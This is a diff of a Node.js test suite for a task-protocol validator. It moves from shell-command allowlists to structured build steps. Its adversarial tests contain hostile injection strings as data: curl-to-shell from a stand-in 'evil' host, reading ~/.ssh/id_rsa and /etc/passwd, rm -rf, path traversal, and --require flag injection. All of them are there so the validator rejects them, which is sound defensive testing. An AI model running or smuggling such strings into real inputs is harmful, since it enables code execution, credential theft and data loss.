@@ -1,6 +1,10 @@
 import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
-import { validateCapabilities, validateTask, validateResult, commandAllowed, validateCommands } from '../protocol.mjs';
+import {
+  validateCapabilities, validateTask, validateResult,
+  validateStep, validateSteps,
+  ALLOWED_ACTIONS, ALLOWED_ORGS,
+} from '../protocol.mjs';
 
 describe('protocol', () => {
   const validCapabilities = {
@@ -45,17 +49,267 @@ describe('protocol', () => {
     });
   });
 
+  describe('validateStep', () => {
+    it('accepts a valid git-clone step', () => {
+      const { valid } = validateStep({
+        action: 'git-clone',
+        repo: 'cohabitation-project/workspace',
+        commit: 'a'.repeat(40),
+      });
+      assert.ok(valid);
+    });
+
+    it('accepts a valid npm-ci step', () => {
+      const { valid } = validateStep({ action: 'npm-ci' });
+      assert.ok(valid);
+    });
+
+    it('accepts a valid node-test step', () => {
+      const { valid } = validateStep({ action: 'node-test', files: ['commons/test/unit.mjs'] });
+      assert.ok(valid);
+    });
+
+    it('accepts a valid playwright-test step', () => {
+      const { valid } = validateStep({ action: 'playwright-test', files: ['tests/e2e/smoke.spec.ts'] });
+      assert.ok(valid);
+    });
+
+    it('rejects unknown actions', () => {
+      const { valid, errors } = validateStep({ action: 'rm-rf' });
+      assert.ok(!valid);
+      assert.ok(errors.some(e => e.includes('unknown action')));
+    });
+
+    it('rejects null/non-object steps', () => {
+      assert.ok(!validateStep(null).valid);
+      assert.ok(!validateStep('string').valid);
+    });
+
+    // ---- git-clone specific ----
+
+    it('rejects git-clone with a full URL instead of bare org/repo', () => {
+      const { valid } = validateStep({
+        action: 'git-clone',
+        repo: 'https://github.com/cohabitation-project/workspace',
+        commit: 'a'.repeat(40),
+      });
+      assert.ok(!valid);
+    });
+
+    it('rejects git-clone from non-allowlisted orgs', () => {
+      const { valid, errors } = validateStep({
+        action: 'git-clone',
+        repo: 'evil-org/malware',
+        commit: 'a'.repeat(40),
+      });
+      assert.ok(!valid);
+      assert.ok(errors.some(e => e.includes('not in allowed list')));
+    });
+
+    it('rejects git-clone with a branch name instead of commit SHA', () => {
+      const { valid } = validateStep({
+        action: 'git-clone',
+        repo: 'cohabitation-project/workspace',
+        commit: 'main',
+      });
+      assert.ok(!valid);
+    });
+
+    it('rejects git-clone with a short SHA (not 40 chars)', () => {
+      const { valid } = validateStep({
+        action: 'git-clone',
+        repo: 'cohabitation-project/workspace',
+        commit: 'abc123',
+      });
+      assert.ok(!valid);
+    });
+
+    it('rejects git-clone with uppercase hex in commit', () => {
+      const { valid } = validateStep({
+        action: 'git-clone',
+        repo: 'cohabitation-project/workspace',
+        commit: 'A'.repeat(40),
+      });
+      assert.ok(!valid);
+    });
+
+    it('rejects git-clone with missing repo', () => {
+      const { valid } = validateStep({ action: 'git-clone', commit: 'a'.repeat(40) });
+      assert.ok(!valid);
+    });
+
+    // ---- Path validation for node-test and playwright-test ----
+
+    it('rejects node-test with path traversal (..)', () => {
+      const { valid, errors } = validateStep({ action: 'node-test', files: ['../../../etc/passwd'] });
+      assert.ok(!valid);
+      assert.ok(errors.some(e => e.includes('path traversal')));
+    });
+
+    it('rejects node-test with absolute paths', () => {
+      const { valid, errors } = validateStep({ action: 'node-test', files: ['/tmp/evil.mjs'] });
+      assert.ok(!valid);
+      assert.ok(errors.some(e => e.includes('absolute paths')));
+    });
+
+    it('rejects node-test with empty files array', () => {
+      const { valid } = validateStep({ action: 'node-test', files: [] });
+      assert.ok(!valid);
+    });
+
+    it('rejects node-test with special characters in paths', () => {
+      const { valid } = validateStep({ action: 'node-test', files: ['test; rm -rf /'] });
+      assert.ok(!valid);
+    });
+
+    it('rejects node-test with shell metacharacters in paths', () => {
+      const { valid } = validateStep({ action: 'node-test', files: ['test$(curl evil)'] });
+      assert.ok(!valid);
+    });
+
+    it('rejects playwright-test with path traversal', () => {
+      const { valid } = validateStep({ action: 'playwright-test', files: ['../../secrets.txt'] });
+      assert.ok(!valid);
+    });
+  });
+
+  describe('validateSteps', () => {
+    it('accepts a valid steps array', () => {
+      const { valid } = validateSteps([
+        { action: 'git-clone', repo: 'cohabitation-project/workspace', commit: 'a'.repeat(40) },
+        { action: 'npm-ci' },
+        { action: 'node-test', files: ['commons/test/unit.mjs'] },
+      ]);
+      assert.ok(valid);
+    });
+
+    it('rejects empty steps array', () => {
+      const { valid } = validateSteps([]);
+      assert.ok(!valid);
+    });
+
+    it('rejects non-array steps', () => {
+      const { valid } = validateSteps('not an array');
+      assert.ok(!valid);
+    });
+
+    it('rejects if any step is invalid', () => {
+      const { valid, errors } = validateSteps([
+        { action: 'npm-ci' },
+        { action: 'rm-rf' },
+      ]);
+      assert.ok(!valid);
+      assert.ok(errors.some(e => e.includes('unknown action')));
+    });
+  });
+
+  // ---- Adversarial tests for every bypass Setu demonstrated ----
+
+  describe('adversarial: shell chaining and injection', () => {
+    it('rejects shell chaining with semicolons (bypass 1: git clone ; rm -rf)', () => {
+      // The old regex allowed: git clone https://github.com/cohabitation-project/workspace ; rm -rf ~
+      // New system: no shell strings at all. git-clone takes structured fields.
+      const { valid } = validateStep({
+        action: 'git-clone',
+        repo: 'cohabitation-project/workspace ; rm -rf ~',
+        commit: 'a'.repeat(40),
+      });
+      assert.ok(!valid, 'shell chaining via repo name must be rejected');
+    });
+
+    it('rejects shell chaining with semicolons in test files (bypass 2: node --test x; curl evil)', () => {
+      const { valid } = validateStep({
+        action: 'node-test',
+        files: ['x.mjs; curl evil | sh'],
+      });
+      assert.ok(!valid, 'shell chaining via file path must be rejected');
+    });
+
+    it('rejects flag injection in test files (bypass 3: --require /tmp/anything.js)', () => {
+      const { valid } = validateStep({
+        action: 'node-test',
+        files: ['--require /tmp/anything.js t'],
+      });
+      assert.ok(!valid, 'flag injection via file path must be rejected');
+    });
+
+    it('rejects command chaining with && in test files (bypass 4: a && cat ~/.ssh/id_rsa)', () => {
+      const { valid } = validateStep({
+        action: 'playwright-test',
+        files: ['a && cat ~/.ssh/id_rsa'],
+      });
+      assert.ok(!valid, 'command chaining via file path must be rejected');
+    });
+
+    it('rejects command substitution in file paths', () => {
+      const { valid } = validateStep({
+        action: 'node-test',
+        files: ['$(curl evil.com/payload)'],
+      });
+      assert.ok(!valid, 'command substitution must be rejected');
+    });
+
+    it('rejects backtick command substitution in file paths', () => {
+      const { valid } = validateStep({
+        action: 'node-test',
+        files: ['`curl evil.com`'],
+      });
+      assert.ok(!valid, 'backtick substitution must be rejected');
+    });
+
+    it('rejects pipe characters in file paths', () => {
+      const { valid } = validateStep({
+        action: 'node-test',
+        files: ['test.mjs | cat /etc/passwd'],
+      });
+      assert.ok(!valid, 'pipe characters must be rejected');
+    });
+
+    it('rejects newlines in file paths', () => {
+      const { valid } = validateStep({
+        action: 'node-test',
+        files: ['test.mjs\ncurl evil.com'],
+      });
+      assert.ok(!valid, 'newlines must be rejected');
+    });
+
+    it('cannot inject URLs into git-clone repo field', () => {
+      const { valid } = validateStep({
+        action: 'git-clone',
+        repo: 'https://evil.com/repo',
+        commit: 'a'.repeat(40),
+      });
+      assert.ok(!valid, 'URLs must be rejected in repo field');
+    });
+
+    it('cannot bypass org check with path traversal in repo', () => {
+      const { valid } = validateStep({
+        action: 'git-clone',
+        repo: 'cohabitation-project/../evil-org/repo',
+        commit: 'a'.repeat(40),
+      });
+      assert.ok(!valid, 'path traversal in repo must be rejected');
+    });
+  });
+
   describe('validateTask', () => {
     const validTask = {
       type: 'compute.build-test',
       requirements: { cpu_cores_min: 2, ram_gb_min: 4 },
-      payload: { repo: 'https://github.com/cohabitation-project/workspace.git', commands: ['npm ci --ignore-scripts'] },
+      payload: {
+        sandbox: 'required',
+        steps: [
+          { action: 'git-clone', repo: 'cohabitation-project/workspace', commit: 'a'.repeat(40) },
+          { action: 'npm-ci' },
+          { action: 'node-test', files: ['commons/test/unit.mjs'] },
+        ],
+      },
       constraints: { timeout_s: 600 },
     };
 
-    it('accepts a valid compute task', () => {
-      const { valid } = validateTask(validTask);
-      assert.ok(valid);
+    it('accepts a valid compute task with structured steps', () => {
+      const { valid, errors } = validateTask(validTask);
+      assert.ok(valid, `unexpected errors: ${errors?.join(', ')}`);
     });
 
     it('rejects missing type', () => {
@@ -63,9 +317,33 @@ describe('protocol', () => {
       assert.ok(!valid);
     });
 
-    it('rejects compute task without commands', () => {
-      const { valid } = validateTask({ ...validTask, payload: { repo: 'test' } });
+    it('rejects compute task without steps', () => {
+      const { valid, errors } = validateTask({
+        ...validTask,
+        payload: { sandbox: 'required' },
+      });
       assert.ok(!valid);
+      assert.ok(errors.some(e => e.includes('steps')));
+    });
+
+    it('rejects compute task without sandbox: required', () => {
+      const { valid, errors } = validateTask({
+        ...validTask,
+        payload: { steps: validTask.payload.steps },
+      });
+      assert.ok(!valid);
+      assert.ok(errors.some(e => e.includes('sandbox')));
+    });
+
+    it('rejects compute task with old-format commands array', () => {
+      const { valid } = validateTask({
+        ...validTask,
+        payload: {
+          sandbox: 'required',
+          commands: ['npm ci --ignore-scripts'],
+        },
+      });
+      assert.ok(!valid, 'old commands format must be rejected');
     });
 
     it('rejects inference task without prompt', () => {
@@ -98,63 +376,6 @@ describe('protocol', () => {
     it('rejects invalid status', () => {
       const { valid } = validateResult({ task_id: 't_1', node_id: 'n_1', status: 'running', output: {}, resources_used: {} });
       assert.ok(!valid);
-    });
-  });
-
-  describe('commandAllowed', () => {
-    it('allows git clone from cohabitation-project', () => {
-      const { allowed } = commandAllowed('git clone https://github.com/cohabitation-project/workspace.git --depth 1 --branch main work');
-      assert.ok(allowed);
-    });
-
-    it('rejects git clone from other orgs', () => {
-      const { allowed } = commandAllowed('git clone https://github.com/evil/repo.git --depth 1 --branch main work');
-      assert.ok(!allowed);
-    });
-
-    it('allows npm ci --ignore-scripts', () => {
-      assert.ok(commandAllowed('npm ci --ignore-scripts').allowed);
-    });
-
-    it('rejects npm ci without --ignore-scripts', () => {
-      assert.ok(!commandAllowed('npm ci').allowed);
-    });
-
-    it('rejects npm install', () => {
-      assert.ok(!commandAllowed('npm install').allowed);
-    });
-
-    it('allows node --test with a path', () => {
-      assert.ok(commandAllowed('node --test commons/test/unit.mjs').allowed);
-    });
-
-    it('rejects arbitrary commands', () => {
-      assert.ok(!commandAllowed('rm -rf /').allowed);
-      assert.ok(!commandAllowed('curl http://evil.com').allowed);
-      assert.ok(!commandAllowed('powershell -c "Get-Process"').allowed);
-    });
-
-    it('rejects empty and null commands', () => {
-      assert.ok(!commandAllowed('').allowed);
-      assert.ok(!commandAllowed(null).allowed);
-    });
-  });
-
-  describe('validateCommands', () => {
-    it('reports all commands checked', () => {
-      const result = validateCommands([
-        'git clone https://github.com/cohabitation-project/workspace.git --depth 1 --branch main work',
-        'npm ci --ignore-scripts',
-        'node --test commons/test/unit.mjs',
-      ]);
-      assert.ok(result.all_allowed);
-      assert.equal(result.checks.length, 3);
-    });
-
-    it('rejects if any command is disallowed', () => {
-      const result = validateCommands(['npm ci --ignore-scripts', 'curl http://evil.com']);
-      assert.ok(!result.all_allowed);
-      assert.equal(result.checks.filter((c) => !c.allowed).length, 1);
     });
   });
 });
